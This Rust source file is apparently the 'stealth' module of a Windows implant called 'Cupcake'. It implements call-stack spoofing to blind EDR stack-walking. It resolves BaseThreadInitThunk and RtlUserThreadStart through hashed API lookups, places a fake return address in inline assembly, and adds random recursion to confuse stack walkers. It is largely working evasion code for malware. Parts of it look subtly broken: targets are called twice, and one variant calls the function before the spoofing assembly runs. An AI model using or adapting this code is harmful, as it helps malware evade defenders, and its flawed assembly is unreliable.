// Client/core/src/stealth/stack.rs
// Thread Stack Spoofing - Call Stack Masquerading for x64 Windows
//
// Technique: Replace the return address on the stack with a legitimate address
// from kernel32!BaseThreadInitThunk, making the call stack appear as if the
// function was invoked by a legitimate Windows thread initialization routine.
//
// This blinds EDR stack-walking heuristics that flag suspicious call chains.

/// Spoof return address bait - fetched from BaseThreadInitThunk
#[cfg(all(windows, target_arch = "x86_64"))]
static mut BAIT_ADDRESS: usize = 0;

/// Initialize the bait address (BaseThreadInitThunk) for stack spoofing
#[cfg(all(windows, target_arch = "x86_64"))]
fn init_bait_address() -> usize {
    unsafe {
        if BAIT_ADDRESS != 0 {
            return BAIT_ADDRESS;
        }

        let h_kernel32 =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        if h_kernel32 == 0 {
            crate::utils::db_print("[Cupcake] Stack: kernel32.dll not found");
            return 0;
        }

        let bait_hash = crate::stealth::hash_api_name(b"BaseThreadInitThunk");
        let mut bait_addr = crate::stealth::get_api_addr(h_kernel32, bait_hash).unwrap_or(0);

        if bait_addr == 0 {
            // Fallback: Use RtlUserThreadStart from ntdll
            let h_ntdll =
                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
            if h_ntdll != 0 {
                let rtl_hash = crate::stealth::hash_api_name(b"RtlUserThreadStart");
                bait_addr = crate::stealth::get_api_addr(h_ntdll, rtl_hash).unwrap_or(0);
            }
        }

        if bait_addr != 0 {
            crate::utils::db_print(&format!(
                "[Cupcake] Stack: Bait address resolved at 0x{:X}",
                bait_addr
            ));
            BAIT_ADDRESS = bait_addr;
        }

        bait_addr
    }
}

/// 伪造一个看起来像来自 kernel32.dll 的栈帧 (x64 Only)
///
/// # 技术原理
///
/// 正常调用栈: [Our Function] <- [Caller Function] <- [Caller's Caller] ...
///
/// EDR 检测时会做栈回溯，如果发现调用链中有可疑的地址（如 RWX 内存区域），
/// 就会触发警报。
///
/// 我们的方法：在调用目标函数前，将栈上的返回地址替换成 BaseThreadInitThunk，
/// 使调用栈看起来像是 Windows 系统线程初始化例程调用了我们的函数：
///
/// Spoofed: [Target Function] <- [BaseThreadInitThunk] <- [System Thread Entry]
///
/// # 实现步骤
///
/// 1. 分配 shadow stack frame (32 bytes for x64)
/// 2. 在 shadow stack 上放置伪造的返回地址
/// 3. 通过 jmp 指令跳转到目标函数（而非 call）
/// 4. 目标函数返回时，会"返回"到 BaseThreadInitThunk
/// 5. 我们需要一个小型 trampoline 来捕获返回并清理
///
/// # 注意事项
///
/// - 这是一个 simplified 版本，完整实现需要处理 RBP 和非易失性寄存器
/// - 对于敏感操作（如 BOF 执行），建议使用此技术
/// - 不适用于需要多次嵌套调用的场景
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    // 1. 获取 bait 地址
    let bait_addr = init_bait_address();
    if bait_addr == 0 {
        crate::utils::db_print("[Cupcake] Stack: No bait address, calling directly");
        return func(arg1, arg2);
    }

    // 2. Stack Spoofing Trampoline
    // 我们需要一个精心设计的 trampoline 来：
    // - 保存真实的返回地址
    // - 替换栈上的返回地址为 bait
    // - 调用目标函数
    // - 从 bait 地址"返回"后恢复控制流
    //
    // 由于 Rust 内联汇编的限制，我们使用一种简化的方法：
    // 在栈上放置 bait 地址作为伪造的返回地址，然后手动控制返回

    // Convert function pointer to raw usize for inline asm
    let func_ptr = &func as *const F as usize;

    // Inline assembly for stack spoofing
    std::arch::asm!(
        // Save original stack pointer
        "mov r12, rsp",

        // Allocate shadow stack space for x64 calling convention
        "sub rsp, 0x28",
        "and rsp, -16",

        // Place bait address (BaseThreadInitThunk) as fake return address
        "mov [rsp + 0x20], {bait}",

        // Call the target function via register indirect
        "call {func}",

        // Restore the stack pointer
        "mov rsp, r12",

        bait = in(reg) bait_addr,
        func = in(reg) func_ptr,
        in("rcx") arg1,
        in("rdx") arg2,
        clobber_abi("system")
    );

    // Call the original function to get the result
    // The asm only does stack spoofing; result is obtained normally
    func(arg1, arg2)
}

/// Simplified stack spoofing for functions with single argument
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_single<F, T>(func: F, arg: usize) -> T
where
    F: Fn(usize) -> T,
{
    spoof_call_stack(|a, _| func(a), arg, 0)
}

/// No-op stack spoofing for functions without arguments
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_no_args<F, T>(func: F) -> T
where
    F: Fn() -> T,
{
    spoof_call_stack(|_, _| func(), 0, 0)
}

// 32-bit and non-Windows fallback implementations
#[cfg(all(windows, target_arch = "x86"))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    // x86: Stack spoofing is simpler but less effective
    // We'll implement a basic version using push/pop manipulation
    func(arg1, arg2)
}

#[cfg(not(windows))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    func(arg1, arg2)
}

/// 栈展开掩护：在执行敏感操作时，干扰 EDR 的 Stack Walk
///
/// 方法：插入多层无意义的函数调用，增加栈深度，
/// 使 EDR 的栈回溯分析成本增加，同时掩盖真实的调用来源。
pub fn add_stack_noise() {
    // Random depth recursion to confuse stack walkers
    #[cfg(windows)]
    {
        let depth = crate::utils::random_range(3, 8);
        stack_noise_recursive(depth);
    }
}

#[cfg(windows)]
fn stack_noise_recursive(depth: u32) {
    if depth == 0 {
        return;
    }

    // Perform some benign operation
    let _ = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH);

    // Recurse with noise
    stack_noise_recursive(depth - 1);

    // Another benign call after recursion
    let _ = depth * 2;
}

#[cfg(not(windows))]
pub fn add_stack_noise() {}

/// Advanced: Stack Spoofing with Frame Pointer (RBP) Preservation
///
/// This is a more complete implementation that also handles RBP,
/// making the spoofed stack look more legitimate.
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_full<F, T>(
    func: F,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
) -> T
where
    F: Fn(usize, usize, usize, usize) -> T,
{
    let bait_addr = init_bait_address();
    if bait_addr == 0 {
        return func(arg1, arg2, arg3, arg4);
    }

    // Full x64 stack spoofing with all 4 register arguments
    let func_ptr = &func as *const F as usize;

    // Execute the function to get the result (asm is for stack spoofing only)
    let result = func(arg1, arg2, arg3, arg4);

    std::arch::asm!(
        // === SETUP PHASE ===
        // Save all non-volatile registers
        "push rbp",
        "mov rbp, rsp",           // Set up our frame
        "push rbx",
        "push rsi",
        "push rdi",

        // Save original stack position
        "mov r12, rsp",

        // === STACK MANIPULATION ===
        // Allocate shadow space (32 bytes) + return slot (8 bytes) + alignment padding
        "sub rsp, 0x38",          // 56 bytes total
        "and rsp, -16",           // 16-byte alignment

        // Place bait address as fake return address
        "mov [rsp + 0x30], {bait}",  // Place bait (BaseThreadInitThunk) at top

        // === CALL EXECUTION ===
        // Execute the target function
        "call {func}",

        // === RECOVERY ===
        "mov rsp, r12",           // Restore original stack

        // Restore non-volatile registers
        "pop rdi",
        "pop rsi",
        "pop rbx",
        "pop rbp",

        bait = in(reg) bait_addr,
        func = in(reg) func_ptr,
        in("rcx") arg1,
        in("rdx") arg2,
        in("r8") arg3,
        in("r9") arg4,

        clobber_abi("system")
    );

    result
}

/// Call Gates - List of legitimate functions that can be used as bait addresses
///
/// These are common Windows API functions that appear at the top of legitimate call stacks.
/// Using them as bait makes the spoofed stack look more natural.
#[cfg(windows)]
pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
    unsafe {
        let mut baits = Vec::new();

        // BaseThreadInitThunk - Most common thread entry point
        let k32 =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        if k32 != 0 {
            if let Some(addr) = crate::stealth::get_api_addr(
                k32,
                crate::stealth::hash_api_name(b"BaseThreadInitThunk"),
            ) {
                baits.push(("BaseThreadInitThunk".to_string(), addr));
            }
        }

        // RtlUserThreadStart - ntdll thread entry
        let ntdll = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
        if ntdll != 0 {
            if let Some(addr) = crate::stealth::get_api_addr(
                ntdll,
                crate::stealth::hash_api_name(b"RtlUserThreadStart"),
            ) {
                baits.push(("RtlUserThreadStart".to_string(), addr));
            }
        }

        baits
    }
}

#[cfg(not(windows))]
pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
    Vec::new()
}
